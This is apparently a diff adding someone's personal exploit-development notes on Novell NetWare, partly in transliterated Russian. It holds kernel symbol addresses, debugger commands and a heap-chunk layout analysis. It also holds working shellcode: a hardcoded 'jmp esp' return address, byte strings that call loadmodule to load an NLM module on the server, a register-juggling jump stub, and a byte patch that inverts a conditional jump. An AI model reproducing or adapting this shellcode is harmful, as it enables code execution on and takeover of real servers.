@@ -1,0 +1,218 @@
+printf:
+
+     push addr_of_message                 // 68 addres (little endian)
+     call clib.nlm|printf                 // e8 xx b25201
+     pop ecx                              // 59
+
+fopen:
+
+     push acces_perm        // 4           
+     push filename          // 4
+     call clib.nlm|fopen
+     add esp,00000008       // back stack
+
+fwrite(buf,71,1,filz);
+
+     push ebx  // descriptor     // 4
+     push 01   // 1              // 4
+     push 47   // 71             // 4
+     push eax  // buffer         // 4  = 10h
+     call clib.nlm|fwrite
+     add esp,00000010     // back stack      
+
+fclose:
+     push ebx // descriptor
+     call clib.nlm|fclose
+     pop ecx
+
+     
+
+in area from fbbed000 to fbbfffff тоже какаято хуйня есть .. :)
+
+
+область загрузки loader.exe (ядро) с fbc00000 по fbc03000. в этой области 
+лежат основные lowlewe syscalls (?)
+
+
+0000: Loader.exe: CpuCurrentProcessor 
+01e4: Server.nlm: CpuMediaManager
+0100: Server.nlm: NestedInterruptCount
+1004: Loader.exe: RunnigProcess
+100c: Server.nlm: ProcessSwitchCount
+2000: Loader.exe: kThreadLibraryContext
+2008: Loader.exe: JavaThreadData
+200c: Loader.exe: kCustomThreadSataArea
+
+
+
+int 3  // EnterDebugger
+
+from fc000000 placed server.nlm func.
+
+
+0xfc000960: server.nlm: returnOSLanguageID
+0xfc00096c: server.nlm: setOSLanguageID
+0xfc008310: server.nlm: kExitNetWare
+0xfc05383c: server.nlm: unformattedOutputToScreen
+
+
+
+d1531a58 - nlmlib.nlm:write
+
+
+
+
+
+
+"n" ??? show ALL symbols !
+P - ni
+S - si
+u - disassemble
+d - dump
+V - show screens
+
+u server.nlm|free
+
+
+
+heap
+
+d1ed4180 malloc(16)  
+
+min 24 +8 =32 
+8 - 4 page (first 2 bytes)
+  if free  - 4 ukazatel na sled tehnich dannie(chank)  (predidushie ?)
+     used  - 4 ukazatel hz kuda.. d245fd61 struktura heap-a ?
+                          
+d245fd60                                             X  I
+     4                    4                   ALRT\x58\x49\x0\x0
+  d1dd27c0             d249c380(.CIR)              \x40\x49
+
+2byta N used
+
+    
+                   ????ddd.nlm                   -18byte 
+                                                      memory used?
+0000 d249c380(.CIR) ALRT\x88\04\x0000
+
+
+6e f5  bilo
+
+6f 6d  stalo posle free (pribavilos` na + (0x78) 120)
+
+
+iz gran + 0x10 v pointer -4
+v gran +0x10 pointer -8 
+
+
+point na ALRT (freep -4)
++0x0c(razmer kakoyta)  - 120(if 100) 
++0x10 kol-vo (-1)
+
+
+
+granica 4k
++0 - ukazatel na to gde hranyatsya pointeri na 4k granici.. 
+			ukazatel na sled 4k ?
+
++0c -- agr k kSpinLockDisable / kspinunlockrestore
+       vozvrat 00204246
+
++0x10 - pointer na chunk sled za CCCC
++0x14 - 03  - kolvo blokov videlenih v 4k -1 pri free
+
+
+
+
++18 s 0 sravnim
++1c - razmer
+        if 0x1fb8   ---  8kb ?
+
+
+pointer na free memory -8
+fb -kernel
+d8 -user
+
+
+
+"\xff\xe4"              //     jmp esp
+
+ff e4
+jmp esp 
+fc427885
+ 
+
+"\x85\x78\x42\xfc"
+
+
+"\xba\xff\xff\xff\xff"  //     mov edx,0xffffffff
+"\x42"			//     inc edx
+"\x52"			//     push edx
+"\x68\x64\x64\x64\x70"  //     push 0x70646464
+"\x89\xe0"		//     mov eax,esp
+"\x52"			//     push edx
+"\x50"			//     push eax
+"\x50"			//     push eax
+"\xb8\x44\x72\x04\xfc"  //     mov eax,0xfc047244  // loadmodule dddp
+"\xff\xd0"		//     call eax
+
+24
+
+"\xba\xff\xff\xff\xff"  //     mov edx,0xffffffff
+"\x42"			//     inc edx
+"\x52"			//     push edx
+"\x68\x6e\x6c\x6d\x20"  //     push 0x
+"\x68\x61\x67\x36\x2e"  //     push 0x
+"\x68\x72\x63\x6f\x6e"  //     push 0x
+"\x89\xe0"		//     mov eax,esp
+"\x52"			//     push edx
+"\x68\x36\x38\x30\x30"  //     push 0x
+"\x68\x34\x20\x20\x31"  //     push 0x
+"\x68\x20\x32\x30\x33"  //     push 0x
+"\x68\x74\x65\x73\x74"  //     push 0x
+"\x68\x6e\x6c\x6d\x20"  //     push 0x
+"\x68\x61\x67\x36\x2e"  //     push 0x
+"\x68\x72\x63\x6f\x6e"  //     push 0x
+"\x89\xe3"		//     mov ebx,esp
+"\x52"			//     push edx
+"\x53"			//     push ebx
+"\x50"			//     push eax
+"\xb8\x44\x72\x04\xfc"  //     mov eax,0xfc047244  // loadmodule
+"\xff\xd0"		//     call eax
+
+72
+
+
+
+
+
+"\x4d" 			 // dec ebp
+"\x4d" 			 // dec ebp
+"\x4d" 			 // dec ebp
+"\x4d" 			 // dec ebp
+"\x8b\x45\x04"  	 //mov eax,[ebp+4]
+"\x45" 			 // inc ebp
+"\x45" 			 // inc ebp
+"\x45" 			 // inc ebp
+"\x45" 			 // inc ebp
+					//add eax,0x1ad
+"\xbb\xff\xff\xff\xff"	 //mov ebx,0xFFFFFFFF
+"\xb9\x52\xfe\xff\xff"   //mov ecx,0xFFFFFE52
+"\x29\xcb"		 //sub ebx,ecx
+"\x01\xd8"		 //add eax,ebx
+
+"\xff\xe0"		 //jmp eax
+27
+
+
+
+if
+74 f1 88 da 81 e2 ff 00 00 00
+
+change
+75 f1 88 da 81 e2 ff 00 00 00
+
+
+
+
+
